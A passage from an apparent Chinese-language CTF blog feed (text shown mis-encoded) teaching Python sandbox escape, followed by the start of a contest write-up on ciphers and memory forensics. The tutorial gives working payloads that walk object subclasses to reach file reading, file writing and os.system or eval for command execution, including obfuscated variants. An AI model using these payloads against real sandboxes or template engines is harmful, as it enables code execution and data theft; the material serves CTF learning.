class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># ç®¡ç†å‘˜åˆ äº†å¾ˆå¤šçš„å±é™©å‡½æ•°</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™importå·²ç»å¤±æ•ˆäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥ç”¨ reloadæ¥é‡æ–°å¯¼å…¥æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¯·æ³¨æ„ï¼Œåœ¨<strong>Python 3.0æŠŠreloadå†…ç½®å‡½æ•°ç§»åˆ°äº†importåº“æ¨¡å—ä¸­ã€‚</strong>æ‰€ä»¥python3ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•å·²ç»å¤±æ•ˆäº†</p><p>æ‰€ä»¥åœ¨åˆ¶ä½œpy2.7æ²™ç®±çš„æ—¶å€™ï¼Œè¿˜éœ€è¦åˆ é™¤<code>reload</code>çš„æ–¹æ³•ã€‚</p><h3 id="ä¸€é“é¢˜ç›®"><a href="#ä¸€é“é¢˜ç›®" class="headerlink" title="ä¸€é“é¢˜ç›®"></a>ä¸€é“é¢˜ç›®</h3><p>è¿™ä¸ªé¢˜ç›®å¾ˆå¸¸è§äº†ï¼Œpy2çš„ç¯å¢ƒï¼Œè‡ªå·±æ‹¿æ¥ç»ƒä¸‹æ‰‹,æœ€åæ˜¯è¯»å–å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„keyæ–‡ä»¶ï¼Œåˆ é™¤äº†å¾ˆå¤šå…³é”®å‡½æ•°ï¼Œä¹ŸåŒ…æ‹¬äº†<code>reload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h4 id="ç”¨fileç±»å»è¯»å–æ–‡ä»¶"><a href="#ç”¨fileç±»å»è¯»å–æ–‡ä»¶" class="headerlink" title="ç”¨fileç±»å»è¯»å–æ–‡ä»¶"></a>ç”¨fileç±»å»è¯»å–æ–‡ä»¶</h4><p>é¢å¯¹è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»ä¸èƒ½ä½¿ç”¨<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>å»è¯»å–æ–‡ä»¶ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨objectç±»å»å¯»æ‰¾fileç±»å»è¯»å–æ–‡ä»¶å†…å®¹</p><p>æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>éšä¾¿æ‰¾ä¸€ä¸ªå†…ç½®ç±»å¯¹è±¡ç”¨<code>__class__</code>æ‹¿åˆ°ä»–æ‰€å¯¹åº”çš„ç±»</li><li>ç”¨<code>__bases__</code>æ‹¿åˆ°åŸºç±»ï¼ˆ<code>&lt;class &#39;object&#39;&gt;</code>ï¼‰</li><li>ç”¨<code>__subclasses__()</code>æ‹¿åˆ°å­ç±»åˆ—è¡¨</li><li>åœ¨å­ç±»åˆ—è¡¨ä¸­ç›´æ¥å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»</li></ol><p>ä¹Ÿå°±æ˜¯</p><p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p><p>ä½†æ˜¯é¢å¯¹<code>__subclasses__</code>çš„å­ç±»å¤ªå¤šæ‰¾ä¸åˆ°å¯¹åº”çš„fileç±»æ€ä¹ˆåŠï¼Ÿå¯ä»¥è¿™æ ·å»å¯»æ‰¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#è¿™é‡Œå¡«å†™ä½ è¦å¯»æ‰¾çš„ç±»å³å¯</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥ç”¨dirå‡½æ•°æŸ¥çœ‹é‡Œé¢çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#åŒæ ·çš„æ•ˆæœ</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>æ³¨æ„py3å·²ç»ç§»é™¤äº†fileäº†è¿™ç§æ–¹æ³•ä¹Ÿåªèƒ½åœ¨py3é‡Œé¢ä½¿ç”¨</p><h4 id="åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤</h4><p>å¯ä»¥æ ¹æ®ç¬¬ä¸€ç§çš„æ€è·¯æ¥ç€æ¢ç´¢ã€‚ç¬¬ä¸€ç§æ­¢æ­¥äºæŠŠå†…ç½®çš„å¯¹è±¡åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶å®å¯ä»¥ç”¨<code>__globals__</code>æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼ŒæŸ¥æ‰¾<code>os</code>æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ ç»§æ‰¿é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½åœ¨py2é‡Œé¢å®ç°ï¼ŒåŒæ ·åœ¨å‰é¢çš„SSTIæ³¨å…¥ä¸­vulhubç»™çš„æµ‹è¯•payloadç”¨çš„æ˜¯<code>class &#39;warnings.catch_warnings&#39;</code>è¿™ä¸€ä¸ªç±»ï¼ŒåŒæ ·è¿™ä¸ªç±»é‡Œé¢ä¹Ÿæœ‰osæ¨¡å—ï¼Œå¯ä»¥åƒä¸‹é¢è¿™ä¸ªæ ·å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:è¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ï¼›</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–¹æ³•å¤§éƒ½æœ‰é™åˆ¶ï¼Œpy2è·Ÿpy3å¯ä»¥ä½¿ç”¨<code>__builtins__</code>é€šåƒ</p><p>py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸º<code>__builtins__</code>è¿”å›çš„æ˜¯ä¸€ä¸ªå­—å…¸ã€‚é€šè¿‡has_keyçš„æ–¹æ³•ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬æƒ³è¦çš„æ˜¯å¦å­˜åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨å‡ºé¢˜çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥æŠŠè¯¥æ¨¡å—ä¸‹çš„å‡½æ•°åˆ æ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure><h2 id="python-ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦"><a href="#python-ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦" class="headerlink" title="python ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦"></a>python ä»£ç æ‰§è¡Œå‡½æ•°ä¸æ–°ç‰¹æ€§ä»¥åŠfä¿®é¥°ç¬¦</h2><p>ä¸‹é¢å†…å®¹æ‘˜å–è‡ª<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>ä»¥åŠ<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p><p>åœ¨pythonä¸­å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°å¦‚ä¸‹æ‰€ç¤º</p><p>ï¼ˆ1ï¼‰timeit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰exec å’Œeval æ¯”è¾ƒç»å…¸äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰platform</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><p>  (4) getattr() å’Œ getattribute()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>â€‹    (5)fä¿®é¥°ç¬¦</p><p>ç”¨fä¿®é¥°çš„å­—ç¬¦ä¸²å°†å¯ä»¥æ‰§è¡Œä»£ç , ä½†åªæœ‰pythonç‰ˆæœ¬åœ¨ 3.6.0æœä¸Šæ‰æœ‰è¿™ä¸ªæ–¹æ³•</p><p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p><p>è¿™ç§ä»£ç æ‰§è¡Œæ–¹æ³•å’ŒPHPä¸­çš„<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>å¾ˆç±»ä¼¼ï¼Œè¿™æ˜¯Pythonä¸­å¾ˆå°‘æœ‰çš„å‡ ä¸ªèƒ½å¤Ÿç›´æ¥å°†å­—ç¬¦ä¸²è½¬å˜æˆçš„ä»£ç çš„æ–¹å¼</p><p>æ‰§è¡Œä»£ç æ€»ç»“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨file()å‡½æ•°è¯»å–æ–‡ä»¶ï¼šï¼ˆå†™ç±»ä¼¼ï¼‰</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># é‡æ–°è½½å…¥__builtins__ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ __getattibute__ æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### ä¸Šè¿°å‘½ä»¤éœ€è¦é€šè¿‡å“¦ exec æˆ–è€…åˆ«çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; å¯¹åº” <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">æ¨èçš„å¦å¤–ä¸€ä¸ªç±»</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure><p>å°±å…ˆæ€»ç»“åˆ°è¿™é‡Œå§ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿è”ç³»èµ·SSTIè¿˜æ˜¯å¯ä»¥èµ·å¾ˆå¤§çš„ä½œç”¨çš„ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p><p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>]]></content>
      
      <categories>
          
          <category> æ²™ç›’ç»•è¿‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ²™ç›’ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’ä¸€æœˆèµ›åšé¢˜è®°å½•</title>
      <link href="/anheng-1mongth.html"/>
      <url>/anheng-1mongth.html</url>
      <content type="html"><![CDATA[<p>è¿™ä¸ªæœˆçš„å®‰æ’æœˆèµ›å¥½åƒå¾ˆæœ‰æ„æ€<a id="more"></a>ï¼Œè‡ªå·±å¿˜äº†å»å‚åŠ äº†2333ï¼Œå›è¿‡å¤´åšä¸€åšè®°å½•ä¸€ä¸‹</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="é”®ç›˜ä¹‹äº‰"><a href="#é”®ç›˜ä¹‹äº‰" class="headerlink" title="é”®ç›˜ä¹‹äº‰"></a>é”®ç›˜ä¹‹äº‰</h4><p>ç™¾åº¦å¯ä»¥çŸ¥é“å†å²ä¸Šæœ‰ä¸¤ç§é”®ç›˜ï¼ŒQWERTYé”®ç›˜è¿˜æ˜¯Dvoraké”®ç›˜ï¼Ÿ</p><p>å…¶å®å°±æ˜¯ä»–ä»¬ä¸¤ä¸ªçš„é”®ç›˜å¯¹åº”çš„ä½ç½®ä¸ä¸€æ ·å¯¼è‡´çš„æ˜ å°„å…³ç³»ï¼Œå¯ä»¥ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wbic16.xedoloh.com/dvorak.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYiUgJ.png" alt="kYiUgJ.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="èµ¢æˆ˜2019"><a href="#èµ¢æˆ˜2019" class="headerlink" title="èµ¢æˆ˜2019"></a>èµ¢æˆ˜2019</h4><p>éƒ½æ˜¯äº›å¸¸è§„æ“ä½œï¼Œbinwalkâ€“&gt;foremostâ€“&gt;stegsolveï¼Œè¯´çœŸçš„ç°åœ¨éƒ½ä¸æƒ³ç©éšå†™</p><p><img src="https://s2.ax1x.com/2019/02/05/kYihDI.png" alt="kYihDI.png"></p><h4 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h4><p>è¿™ä¸ªéšå†™é¢˜ç›®å°±æœ‰ç‚¹æ„æ€å•¦ï¼Œæˆ‘ä»¥å‰æ²¡ç¢°åˆ°è¿‡è¿™ç§å†…å­˜å–è¯çš„ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡ç« <code>https://www.freebuf.com/column/152545.html</code>ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»äº†å¾ˆå¤šå…³äºå†…å­˜å–è¯è¿™æ¬¾è½¯ä»¶çš„æ“ä½œï¼Œå¤§è‡´çš„volatility ä½¿ç”¨å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;æ–‡ä»¶å&gt; â€“profile=&lt;é…ç½®æ–‡ä»¶&gt; &lt;æ’ä»¶&gt; [æ’ä»¶å‚æ•°]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨imageinfoæ’ä»¶æ¥çŒœæµ‹dumpæ–‡ä»¶çš„profileå€¼ï¼Œ<code>volatility -f memory 